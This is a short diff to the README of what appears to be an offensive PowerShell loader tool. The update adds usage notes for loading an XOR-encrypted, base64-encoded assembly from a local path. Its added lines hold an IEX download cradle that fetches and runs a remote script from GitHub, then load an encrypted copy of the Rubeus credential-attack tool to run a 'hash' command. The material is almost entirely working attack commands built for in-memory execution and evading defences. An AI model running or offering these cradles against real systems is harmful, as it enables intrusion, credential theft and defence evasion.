@@ -218,3 +218,11 @@ PS C:\Users\pentester> Invoke-LoadAssemblyXOR -AssemblyUrl "https://test.1o1.st/
 
 PS C:\Users\pentester>
 ```
+
+## [Update] Add a feature to load XOR encrypted and base64 encoded payload from local path. This might be useful in some extreme situation.
+
+```
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyXORLocal.ps1"));
+Invoke-LoadAssemblyXOR -AssemblyPath "C:\\Windows\\Tasks\\rubeusxorb64meow.txt" -KeyString "enc_password_here" -Command "hash /password:test"
+
+```
